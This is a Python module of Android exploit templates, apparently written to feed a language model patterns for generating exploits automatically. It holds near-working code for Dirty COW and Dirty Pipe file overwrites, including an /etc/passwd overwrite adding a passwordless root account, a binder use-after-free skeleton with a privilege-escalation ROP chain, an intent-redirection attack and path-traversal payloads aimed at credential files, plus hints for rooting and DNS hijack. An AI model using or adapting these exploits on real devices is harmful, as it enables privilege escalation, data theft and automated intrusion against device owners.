"""
Exploit Templates for Common Android Vulnerability Classes

These templates provide the LLM with proven exploit patterns to adapt,
rather than generating exploits from scratch (which often fails).

Based on real-world Android CVEs and exploitation techniques.
"""

from dataclasses import dataclass, field
from enum import Enum
from typing import Optional


class VulnerabilityClass(Enum):
    """Common Android vulnerability classes."""
    USE_AFTER_FREE = "use_after_free"
    RACE_CONDITION = "race_condition"
    INTEGER_OVERFLOW = "integer_overflow"
    BUFFER_OVERFLOW = "buffer_overflow"
    TYPE_CONFUSION = "type_confusion"
    ARBITRARY_WRITE = "arbitrary_write"
    ARBITRARY_READ = "arbitrary_read"
    LOGIC_BUG = "logic_bug"
    INTENT_REDIRECT = "intent_redirect"
    PATH_TRAVERSAL = "path_traversal"
    PERMISSION_BYPASS = "permission_bypass"
    BINDER_UAF = "binder_uaf"
    KERNEL_UAF = "kernel_uaf"
    PIPE_PRIMITIVE = "pipe_primitive"


@dataclass
class ExploitTemplate:
    """Template for a specific vulnerability class."""
    vuln_class: VulnerabilityClass
    name: str
    description: str
    target_component: str  # kernel, binder, mediaserver, system_ui, etc.
    prerequisites: list[str]
    exploit_steps: list[str]
    code_template: str
    adaptation_hints: list[str]
    example_cves: list[str]
    success_indicators: list[str]


# ═══════════════════════════════════════════════════════════════════════════════
# KERNEL EXPLOIT TEMPLATES
# ═══════════════════════════════════════════════════════════════════════════════

DIRTY_COW_TEMPLATE = ExploitTemplate(
    vuln_class=VulnerabilityClass.RACE_CONDITION,
    name="Dirty COW Race Condition",
    description="Exploit copy-on-write race condition to overwrite read-only files",
    target_component="kernel",
    prerequisites=[
        "Kernel < 4.8.3 or unpatched",
        "Target file must be readable",
        "madvise() and write() available",
    ],
    exploit_steps=[
        "1. Open target read-only file",
        "2. Create memory mapping with MAP_PRIVATE",
        "3. Race madvise(MADV_DONTNEED) against write()",
        "4. Win race to write to read-only page",
        "5. Overwrite /etc/passwd, /system/bin/run-as, or SUID binary",
    ],
    code_template='''#!/usr/bin/env python3
"""
Dirty COW (CVE-2016-5195) - Race Condition Exploit Template
Target: {target_device}
"""
import os
import mmap
import threading
import ctypes
from ctypes import CDLL

libc = CDLL("libc.so.6")

# Target file to overwrite (customize based on objective)
TARGET_FILE = "{target_file}"  # e.g., /system/bin/run-as
PAYLOAD = b"{payload}"

def madvise_thread(addr, length):
    """Thread that calls madvise(MADV_DONTNEED) in a loop."""
    MADV_DONTNEED = 4
    while not stop_flag:
        libc.madvise(addr, length, MADV_DONTNEED)

def write_thread(fd, payload):
    """Thread that writes payload in a loop."""
    while not stop_flag:
        os.lseek(fd, 0, os.SEEK_SET)
        os.write(fd, payload)

def exploit():
    global stop_flag
    stop_flag = False

    # Open target file
    fd = os.open(TARGET_FILE, os.O_RDONLY)
    file_size = os.fstat(fd).st_size

    # Create private mapping
    mapping = mmap.mmap(fd, file_size, mmap.MAP_PRIVATE, mmap.PROT_READ)
    addr = ctypes.addressof(ctypes.c_char.from_buffer(mapping))

    # Open /proc/self/mem for writing
    mem_fd = os.open("/proc/self/mem", os.O_RDWR)

    # Start race threads
    t1 = threading.Thread(target=madvise_thread, args=(addr, file_size))
    t2 = threading.Thread(target=write_thread, args=(mem_fd, PAYLOAD))

    t1.start()
    t2.start()

    # Race for a few seconds
    import time
    time.sleep(5)
    stop_flag = True

    t1.join()
    t2.join()

    print(f"[*] Check if {TARGET_FILE} was modified")

if __name__ == "__main__":
    exploit()
''',
    adaptation_hints=[
        "For Android: target /system/bin/run-as to get shell as any app",
        "Alternative: overwrite /system/etc/hosts for DNS hijack",
        "For root: chain with /system/bin/su or Magisk payload",
        "Adjust race timing based on CPU cores and load",
    ],
    example_cves=["CVE-2016-5195"],
    success_indicators=[
        "Target file contents changed",
        "run-as executes with elevated privileges",
        "id command shows different uid",
    ],
)


DIRTY_PIPE_TEMPLATE = ExploitTemplate(
    vuln_class=VulnerabilityClass.PIPE_PRIMITIVE,
    name="Dirty Pipe Arbitrary File Overwrite",
    description="Exploit pipe page cache poisoning to overwrite arbitrary files",
    target_component="kernel",
    prerequisites=[
        "Linux kernel 5.8 - 5.16.11 / 5.15.25 / 5.10.102",
        "Target file must be readable",
        "splice() syscall available",
    ],
    exploit_steps=[
        "1. Create pipe and fill with data",
        "2. Drain pipe but keep PIPE_BUF_FLAG_CAN_MERGE flag",
        "3. Open target file read-only",
        "4. Use splice() to read file into pipe",
        "5. Write payload - overwrites file page cache",
    ],
    code_template='''#!/usr/bin/env python3
"""
Dirty Pipe (CVE-2022-0847) - Arbitrary File Overwrite Template
Target: {target_device}

Kernel 5.8+ only. Allows overwriting read-only files.
"""
import os
import struct
import subprocess

# Native helper code (compile with NDK for Android)
NATIVE_CODE = """
#define _GNU_SOURCE
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s target_file offset payload\\n", argv[0]);
        return 1;
    }

    const char *target = argv[1];
    off_t offset = atoll(argv[2]);
    const char *payload = argv[3];
    size_t payload_len = strlen(payload);

    // Create pipe
    int pipefd[2];
    pipe(pipefd);

    // Fill pipe and drain to set PIPE_BUF_FLAG_CAN_MERGE
    char buf[4096];
    memset(buf, 'A', sizeof(buf));

    for (int i = 0; i < 16; i++) {
        write(pipefd[1], buf, sizeof(buf));
    }
    for (int i = 0; i < 16; i++) {
        read(pipefd[0], buf, sizeof(buf));
    }

    // Open target read-only
    int fd = open(target, O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    // Splice file into pipe
    lseek(fd, offset, SEEK_SET);
    ssize_t n = splice(fd, NULL, pipefd[1], NULL, 1, 0);
    if (n < 0) {
        perror("splice");
        return 1;
    }

    // Write payload - this overwrites the file!
    write(pipefd[1], payload, payload_len);

    printf("[+] Payload written to %s at offset %lld\\n", target, offset);
    close(fd);
    return 0;
}
"""

def compile_native(ndk_path="/opt/android-ndk"):
    """Compile native helper using Android NDK."""
    with open("/tmp/dirtypipe.c", "w") as f:
        f.write(NATIVE_CODE)

    subprocess.run([
        f"{ndk_path}/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android30-clang",
        "-o", "/tmp/dirtypipe",
        "/tmp/dirtypipe.c",
        "-static"
    ], check=True)

    return "/tmp/dirtypipe"

def exploit(target_file, offset, payload):
    """Push and run exploit on device."""
    binary = compile_native()

    # Push to device
    subprocess.run(["adb", "push", binary, "/data/local/tmp/"], check=True)
    subprocess.run(["adb", "shell", "chmod", "755", "/data/local/tmp/dirtypipe"], check=True)

    # Run exploit
    result = subprocess.run([
        "adb", "shell", "/data/local/tmp/dirtypipe",
        target_file, str(offset), payload
    ], capture_output=True, text=True)

    print(result.stdout)
    if result.returncode == 0:
        print("[+] Exploit successful!")
    else:
        print(f"[-] Exploit failed: {result.stderr}")

if __name__ == "__main__":
    # Example: Overwrite /etc/passwd
    exploit("/etc/passwd", 0, "root::0:0:root:/root:/bin/sh\\n")
''',
    adaptation_hints=[
        "For Android root: overwrite /system/bin/su permissions",
        "Overwrite APK signature verification",
        "Target /data/system files for credential access",
        "Works on unmodified devices with vulnerable kernel",
    ],
    example_cves=["CVE-2022-0847"],
    success_indicators=[
        "Target file contents modified",
        "No permission denied errors",
        "File verification shows payload",
    ],
)


BINDER_UAF_TEMPLATE = ExploitTemplate(
    vuln_class=VulnerabilityClass.BINDER_UAF,
    name="Binder Use-After-Free",
    description="Exploit binder driver UAF for kernel code execution",
    target_component="binder",
    prerequisites=[
        "Vulnerable binder driver version",
        "Ability to create binder transactions",
        "Heap spray capability",
    ],
    exploit_steps=[
        "1. Create binder node with specific layout",
        "2. Trigger free of binder buffer/node",
        "3. Reclaim freed memory with controlled data",
        "4. Trigger use of freed object",
        "5. Achieve kernel ROP/JOP execution",
    ],
    code_template='''#!/usr/bin/env python3
"""
Binder UAF Exploit Template (CVE-2019-2215 style)
Target: {target_device}

Generic template - specific offsets depend on kernel version.
"""
import os
import mmap
import struct
import subprocess

# Constants - adjust for target kernel
BINDER_DEV = "/dev/binder"
KERNEL_BASE = 0xffffff8008000000  # Typical ARM64
COMMIT_CREDS = KERNEL_BASE + 0x{commit_creds_offset}
PREPARE_KERNEL_CRED = KERNEL_BASE + 0x{prepare_kernel_cred_offset}

def create_binder_fd():
    """Open binder device."""
    return os.open(BINDER_DEV, os.O_RDWR)

def trigger_uaf(binder_fd):
    """
    Trigger the use-after-free condition.

    This is CVE-specific - the exact trigger varies:
    - CVE-2019-2215: epoll + BINDER_THREAD_EXIT
    - CVE-2020-0041: specific transaction sequence
    """
    # Placeholder - implement specific trigger
    pass

def heap_spray(target_data, count=1000):
    """Spray kernel heap with controlled data."""
    spray_fds = []
    for _ in range(count):
        # Use sendmsg with SCM_RIGHTS or similar
        # to spray controlled objects
        pass
    return spray_fds

def exploit():
    print("[*] Opening binder device...")
    binder_fd = create_binder_fd()

    print("[*] Setting up heap spray...")
    # Craft payload for kernel ROP
    rop_chain = struct.pack("<Q", PREPARE_KERNEL_CRED)
    rop_chain += struct.pack("<Q", COMMIT_CREDS)

    spray_fds = heap_spray(rop_chain)

    print("[*] Triggering UAF...")
    trigger_uaf(binder_fd)

    print("[*] Checking for root...")
    result = subprocess.run(["id"], capture_output=True, text=True)
    if "uid=0" in result.stdout:
        print("[+] GOT ROOT!")
        subprocess.run(["/system/bin/sh"])
    else:
        print("[-] Exploit failed")

if __name__ == "__main__":
    exploit()
''',
    adaptation_hints=[
        "Get kernel symbols from /proc/kallsyms if readable",
        "Use kernel address leak primitive first",
        "Timing is critical - may need multiple attempts",
        "Stack pivot gadgets vary by kernel version",
    ],
    example_cves=["CVE-2019-2215", "CVE-2020-0041", "CVE-2023-20938"],
    success_indicators=[
        "id shows uid=0",
        "Can access /data/data/* for all apps",
        "setenforce 0 succeeds",
    ],
)


# ═══════════════════════════════════════════════════════════════════════════════
# APPLICATION-LEVEL EXPLOIT TEMPLATES
# ═══════════════════════════════════════════════════════════════════════════════

INTENT_REDIRECT_TEMPLATE = ExploitTemplate(
    vuln_class=VulnerabilityClass.INTENT_REDIRECT,
    name="Intent Redirection",
    description="Exploit unvalidated intent handling to access protected components",
    target_component="application",
    prerequisites=[
        "Exported activity/service accepts Intent extras",
        "Target component processes Intent.getParcelableExtra() unsafely",
        "Protected component exists in same app",
    ],
    exploit_steps=[
        "1. Identify exported component that accepts intents",
        "2. Find internal component that handles sensitive operations",
        "3. Craft Intent with nested Intent as extra",
        "4. Target app re-broadcasts or starts nested intent",
        "5. Access protected component with escalated privileges",
    ],
    code_template='''#!/usr/bin/env python3
"""
Intent Redirection Exploit Template
Target: {target_package}

Exploits apps that unsafely handle Intent extras.
"""
import subprocess

TARGET_PACKAGE = "{target_package}"
EXPORTED_COMPONENT = "{exported_component}"  # e.g., .ExportedActivity
PROTECTED_COMPONENT = "{protected_component}"  # e.g., .InternalAdminActivity

def craft_nested_intent():
    """Craft nested intent payload."""
    # The inner intent targets the protected component
    inner_intent = f"intent:#Intent;component={TARGET_PACKAGE}/{PROTECTED_COMPONENT};end"

    # Build ADB command
    cmd = [
        "adb", "shell", "am", "start",
        "-n", f"{TARGET_PACKAGE}/{EXPORTED_COMPONENT}",
        "--es", "next_intent", inner_intent,  # Common extra names
        "--es", "url", inner_intent,
        "--es", "redirect", inner_intent,
    ]

    return cmd

def exploit():
    print(f"[*] Targeting: {TARGET_PACKAGE}")
    print(f"[*] Exported: {EXPORTED_COMPONENT}")
    print(f"[*] Protected: {PROTECTED_COMPONENT}")

    cmd = craft_nested_intent()
    print(f"[*] Executing: {' '.join(cmd)}")

    result = subprocess.run(cmd, capture_output=True, text=True)

    if "Error" in result.stderr:
        print(f"[-] Failed: {result.stderr}")
    else:
        print("[+] Intent sent - check device screen")
        print("[*] If protected activity opened, exploit succeeded")

if __name__ == "__main__":
    exploit()
''',
    adaptation_hints=[
        "Common intent extra names: next_intent, url, redirect, callback",
        "Check for startActivityForResult patterns in target app",
        "Use Frida to trace intent handling if uncertain",
        "PendingIntent misuse is a related variant",
    ],
    example_cves=["CVE-2021-25386", "CVE-2017-13286"],
    success_indicators=[
        "Protected activity/service activated",
        "Sensitive data disclosed",
        "Privileged action performed",
    ],
)


PATH_TRAVERSAL_TEMPLATE = ExploitTemplate(
    vuln_class=VulnerabilityClass.PATH_TRAVERSAL,
    name="Content Provider Path Traversal",
    description="Exploit FileProvider or ContentProvider to access arbitrary files",
    target_component="content_provider",
    prerequisites=[
        "App exports ContentProvider with file access",
        "Provider doesn't sanitize path components",
        "Target file readable by app's UID",
    ],
    exploit_steps=[
        "1. Identify exported ContentProvider URIs",
        "2. Craft URI with ../ path traversal",
        "3. Request file via ContentResolver",
        "4. Read arbitrary files within app's sandbox",
        "5. Chain with other vulns for escalation",
    ],
    code_template='''#!/usr/bin/env python3
"""
Content Provider Path Traversal Template
Target: {target_package}

Exploits ContentProviders with insufficient path validation.
"""
import subprocess
import base64

TARGET_PACKAGE = "{target_package}"
PROVIDER_AUTHORITY = "{provider_authority}"

# Common traversal payloads
TRAVERSAL_PAYLOADS = [
    "../../../shared_prefs/credentials.xml",
    "../../../databases/data.db",
    "../../../files/secret.key",
    "..%2F..%2F..%2Fshared_prefs%2Fcredentials.xml",
    "....//....//....//shared_prefs//credentials.xml",
]

def try_traversal(path):
    """Attempt to read file via content provider."""
    uri = f"content://{PROVIDER_AUTHORITY}/{path}"

    # Use content command to query
    cmd = ["adb", "shell", "content", "read", "--uri", uri]
    result = subprocess.run(cmd, capture_output=True, text=True)

    return result.stdout, result.stderr

def exploit():
    print(f"[*] Testing path traversal on: {PROVIDER_AUTHORITY}")

    for payload in TRAVERSAL_PAYLOADS:
        print(f"[*] Trying: {payload}")
        stdout, stderr = try_traversal(payload)

        if stdout and "Exception" not in stderr:
            print(f"[+] SUCCESS with: {payload}")
            print(f"[+] Content:\\n{stdout[:500]}")
            return True
        else:
            print(f"[-] Failed: {stderr[:100]}")

    print("[-] No traversal worked")
    return False

if __name__ == "__main__":
    exploit()
''',
    adaptation_hints=[
        "Check AndroidManifest.xml for exported providers",
        "FileProvider with root-path is especially dangerous",
        "Combine with ZIP slip for write primitives",
        "Use drozer for automated provider testing",
    ],
    example_cves=["CVE-2021-25383", "CVE-2018-9493"],
    success_indicators=[
        "File contents returned",
        "No SecurityException",
        "Access to shared_prefs/databases",
    ],
)


# ═══════════════════════════════════════════════════════════════════════════════
# TEMPLATE REGISTRY
# ═══════════════════════════════════════════════════════════════════════════════

EXPLOIT_TEMPLATES: dict[str, ExploitTemplate] = {
    "dirty_cow": DIRTY_COW_TEMPLATE,
    "dirty_pipe": DIRTY_PIPE_TEMPLATE,
    "binder_uaf": BINDER_UAF_TEMPLATE,
    "intent_redirect": INTENT_REDIRECT_TEMPLATE,
    "path_traversal": PATH_TRAVERSAL_TEMPLATE,
}

# Map CVEs to templates
CVE_TO_TEMPLATE: dict[str, str] = {
    "CVE-2016-5195": "dirty_cow",
    "CVE-2022-0847": "dirty_pipe",
    "CVE-2019-2215": "binder_uaf",
    "CVE-2020-0041": "binder_uaf",
    "CVE-2023-20938": "binder_uaf",
    "CVE-2021-0920": "binder_uaf",  # unix_gc UAF uses similar techniques
    "CVE-2021-25386": "intent_redirect",
    "CVE-2021-25383": "path_traversal",
}


def get_template(cve_id: str) -> Optional[ExploitTemplate]:
    """Get exploit template for a CVE."""
    template_name = CVE_TO_TEMPLATE.get(cve_id)
    if template_name:
        return EXPLOIT_TEMPLATES.get(template_name)
    return None


def get_template_by_class(vuln_class: VulnerabilityClass) -> list[ExploitTemplate]:
    """Get all templates for a vulnerability class."""
    return [t for t in EXPLOIT_TEMPLATES.values() if t.vuln_class == vuln_class]


def list_templates() -> list[str]:
    """List all available template names."""
    return list(EXPLOIT_TEMPLATES.keys())
